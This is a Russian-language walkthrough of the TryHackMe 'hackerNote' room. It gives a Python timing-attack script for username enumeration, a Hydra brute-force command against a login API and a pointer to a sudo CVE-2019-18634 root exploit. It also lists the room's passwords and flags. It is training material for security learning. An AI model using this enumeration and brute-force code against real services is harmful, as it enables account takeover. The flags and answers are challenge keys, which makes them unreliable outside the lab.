

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [hackerNote](https://tryhackme.com/r/room/hackernote) 

Всего 6 заданий:
## Задание 1
Вам представлена машина. Первым шагом должна быть разведка. Просканируйте машину с помощью nmap, выясните, что 
запущено. 
### Ответьте на вопросы ниже
Какие порты открыты? (в порядке возрастания)
```commandline
nmap -sSCV -p- <IP>
```
```commandline
22,80,8080
```
На каком языке программирования написан бэкэнд?
```commandline
go
```

## Задание 2
Теперь, когда вы знаете, что работает, вам нужно провести расследование. С веб-приложениями обычный процесс — 
кликать. Создайте учетную запись, используйте веб-приложение как пользователь и уделите пристальное внимание деталям.  

### Ответьте на вопросы ниже
Создайте свою собственную учетную запись пользователя
```commandline
Ответ не нужен
```
Войдите в свою учетную запись
```commandline
Ответ не нужен
```
Попробуйте войти в систему с использованием недействительной учетной записи пользователя.
```commandline
Ответ не нужен
```
Попробуйте войти в свою учетную запись, используя неверный пароль.
```commandline
Ответ не нужен
```
Обратите внимание на разницу во времени. Это позволяет перечислять пользователей
```commandline
Ответ не нужен
```

## Задание 3
Используйте атаку по времени

Теперь, когда мы знаем, что существует атака по времени, мы можем написать скрипт на Python для ее эксплуатации.

Первый шаг — разобраться, как работают запросы на вход. Для этого можно использовать Burpsuite, но я предпочитаю 
использовать Firefox dev tools, так как мне не нужно настраивать никаких прокси.

Здесь мы видим, что логин — это POST-запрос к /api/user/login. Это означает, что мы можем сделать этот запрос, 
используя CURL, python или другой язык программирования по вашему выбору.


В Python мы можем использовать этот код и библиотеку Requests для отправки этого запроса следующим образом:

```commandline
creds = {"username":username,"password":"invalidPassword!"}
response = r.post(URL,json=creds)
```
Следующий этап — это синхронизация. Используя стандартную библиотеку «time», мы можем вычислить разницу во времени 
между отправкой запроса и получением ответа. Я переместил запрос на вход в его собственную функцию, называемую doLogin. 

```commandline
startTime = time.time()
doLogin(user)
endTime = time.time()
```
Следующий шаг — повторить это для всех имен пользователей в списке имен пользователей. Это можно сделать с помощью 
серии циклов for. Первый будет считывать имена пользователей из файла в список, а второй будет проверять каждое из 
этих имен пользователей и смотреть время, необходимое для ответа. Для моего эксплойта я решил, что времена в 
пределах 10% от самого большого времени, скорее всего, будут действительными именами пользователей.


Почему время меняется?

Бэкенд намеренно плохо написан. Сервер попытается проверить пароль пользователя только в том случае, если получит 
правильное имя пользователя. Ниже приведен псевдокод, поясняющий это лучше. 

Код входа HackerNote
```commandline
def login(username, password):
    if username in users: ##If it's a valid username
        login_status = check_password(password) ##This takes a noticeable amount of time
        if login_status:
            return new_session_token()
        else:
            return "Username or password incorrect"
    else:
        return "Username or password incorrect"
```

Готовые эксплойты на Golang и Python доступны здесь:  https://github.com/NinjaJc01/hackerNoteExploits

Используйте захват Honeypot или Names/names.txt из  https://github.com/danielmiessler/SecLists/tree/master/Usernames 
. Чем короче список, тем быстрее завершится эксплойт. (Подсказка: один из этих списков слов короче.) 

ПРИМЕЧАНИЕ: Эксплойт Golang ненадежен, но он быстрее. Если вы получаете недействительные имена пользователей, 
попробуйте запустить его снова через минуту или переключиться на эксплойт python. 

### Ответьте на вопросы ниже
Попробуйте написать скрипт для проведения атаки по времени.
```commandline
#!/usr/bin/env python3
import sys
import requests
import time

def main():
    host = '10.10.156.130'

    with open(sys.argv[1]) as f:
        usernames = f.readlines()
    usernames = [x.strip() for x in usernames] 

    for username in usernames:
        start = time.time()
        creds = {"username":username,"password":"notimportant"}
        r = requests.post("http://{}/api/user/login".format(host), data=creds)
        done = time.time()
        elapsed = done - start
        if elapsed > 1:
            print("[*] Valid user found: {}".format(username))

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: {} /path/usernames/file.txt".format(sys.argv[0]))
        sys.exit(1) 
    main()
```
```commandline
Ответ не нужен
```
Сколько имен пользователей из списка действительны?
```commandline
./bruteforce-user.py /data/src/SecLists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt 
```
```commandline
1
```
Каковы действительные имена пользователей?
```commandline
james
```

## Задание 4
Следующий шаг

Теперь, когда у нас есть имя пользователя, нам нужен пароль. Поскольку пароли хэшируются с помощью bcrypt и требуют заметного времени для проверки, брутфорс с большим списком слов, таким как rockyou, невозможен.
К счастью, в этом веб-приложении есть подсказки для паролей!

С именем пользователя, которое мы нашли на последнем шаге, мы можем получить подсказку пароля. Из этой подсказки пароля мы можем создать список слов и (более) эффективно подобрать пароль пользователя.

Создайте свой список слов

Подсказка к паролю — «мой любимый цвет и мое любимое число», поэтому мы можем получить список слов цветов и список слов цифр и объединить их с помощью комбинатора Hashcat Util, который даст нам каждую комбинацию из двух списков слов. Используя этот список слов, мы можем затем использовать Hydra для атаки на маршрут API входа и найти пароль пользователя. Загрузите прикрепленные файлы списка слов, просмотрите их, а затем объедините с помощью комбинатора hashcat-util.
Утилиты Hashcat можно загрузить с:  https://github.com/hashcat/hashcat-utils/releases
Либо добавьте их в PATH, либо запустите их из папки.
Мы хотим использовать двоичный файл Combinator.bin с colors.txt и numbers.txt в качестве входных данных. Команда для этого (предполагается, что вы находитесь в каталоге с двоичными файлами и скопировали файлы txt в этот каталог):

./combinator.bin цвета.txt числа.txt > список слов.txt
Это даст вам список слов, который можно использовать для Hydra .


Атака на API

Запрос HTTP POST , который мы захватили ранее, говорит нам достаточно об API , чтобы мы могли использовать Hydra для атаки на него.
API на самом деле разработан для приема данных Form или данных JSON. Фронтенд отправляет данные JSON как запрос POST, поэтому мы будем использовать его. Hydra позволяет атаковать запросы HTTP POST с помощью модуля HTTP -POST. Чтобы использовать это, нам нужно:

Текст запроса — JSON
{"имя пользователя":"администратор","пароль":"администратор"}
Путь запроса -
/api/пользователь/логин
Сообщение об ошибке при неправильном входе в систему -
«Неверное имя пользователя или пароль»
Команда для этого следующая (замените части угловыми скобками, вам нужно будет экранировать специальные символы):

hydra -l <имя пользователя> -P <список слов> 192.168.2.62 http-post-form <путь>:<тело>:<сообщение_об_ошибке>
### Ответьте на вопросы ниже
Сформируйте команду hydra для атаки на маршрут API входа
```commandline
hydra -l james -P wordlist.txt <IP> http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"
```
```commandline
Ответ не нужен
```
Сколько паролей было в вашем списке слов?
```commandline
./combinator.bin colors.txt numbers.txt > wordlist.txt
wc -l wordlist.txt
```
```commandline
180
```
Какой пароль был у пользователя?
```commandline
hydra -l james -P wordlist.txt <IP> http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"
```
```commandline
blue7
```
Войдите как пользователь на платформу
```commandline
Ответ не нужен
```
Какой у пользователя пароль SSH?
```commandline
dak4ddb37b
```
Войдите в систему SSH как пользователь, используя имеющиеся у вас учетные данные.
```commandline
Ответ не нужен
```
Что такое флаг пользователя?
```commandline
ssh james@<IP>
james:dak4ddb37b
ls -l
cat user.txt
```
```commandline
thm{56911bd7ba1371a3221478aa5c094d68}
```

## Задание 5
Перечень привилегий

Теперь, когда у вас есть сеанс SSH, вы можете получить флаг пользователя. Но этого должно быть недостаточно для вас, 
вам нужен root. 
Хороший первый шаг для повышения привилегий — проверить, можете ли вы запустить sudo. У вас есть пароль для текущего 
пользователя, поэтому вы можете запустить команду:

```commandline
sudo -l
```
Эта команда сообщает вам, какие команды вы можете запускать как суперпользователь с помощью sudo. К сожалению, 
текущий пользователь не может запускать команды как root. Однако вы могли заметить, что при вводе пароля вы видите 
звездочки. Это не поведение по умолчанию. Недавно был выпущен CVE , который влияет на эту конфигурацию. Параметр 
называется pwdfeedback.

### Ответьте на вопросы ниже
Какой номер CVE у эксплойта?
```commandline
CVE-2019-18634
```
Найдите эксплойт по адресу  https://github.com/saleemrashid/ и загрузите файлы.
```commandline
Ответ не нужен
```
Скомпилируйте эксплойт из Kali Linux.
```commandline
Ответ не нужен
```
SCP — двоичный файл эксплойта для коробки.
```commandline
Ответ не нужен
```
Запустите эксплойт, получите права root.
```commandline
Ответ не нужен
```
Что такое корневой флаг?
```commandline
thm{af55ada6c2445446eb0606b5a2d3a4d2}
```

## Задание 6
Веб-приложение

Эта комната была разработана так, чтобы быть более реалистичной и менее ориентированной на CTF. Логика, лежащая в 
основе атаки по времени, упоминается в разделе аутентификации OWASP, и довольно похожая атака по времени 
существовала на OpenSSH, позволяя перечислять имена пользователей. Я включил ссылки на это в раздел «Дополнительное 
чтение»

Подсказки к паролю в веб-приложениях обычно считаются плохой практикой, но крупные компании все равно часто их 
включают.  Adobe пострадала от крупной утечки данных, затронувшей пользователей Creative Cloud, и расшифровка 
паролей стала намного проще благодаря подсказкам к паролю, также включенным в утечку.


 Повышение привилегий

Повышение привилегий для этого ящика представляет собой реальную уязвимость CVE и влияет на  стандартные 
конфигурации sudo в macOS, Linux Mint и ElementaryOS.


Дальнейшее чтение

Атаки по времени на логины
https://seclists.org/fulldisclosure/2016/Jul/51
https://www.gnucitizen.org/blog/username-enumeration-vulnerabilities/
https://wiki.owasp.org/index.php/Тестирование_перечисления_пользователей_и_угадывания_учетной_записи_пользователя_(OWASP -AT -002)

Взлом пароля Adobe
https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/


Sudo CVE
https://dylankatz.com/Analysis-of- CVE -2019-18634/
https://nvd.nist.gov/vuln/detail/ CVE -2019-18634
https://tryhackme.com/room/sudovulnsbof

### Ответьте на вопросы ниже
Читайте, исследуйте, учитесь.
```commandline
Ответ не нужен
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)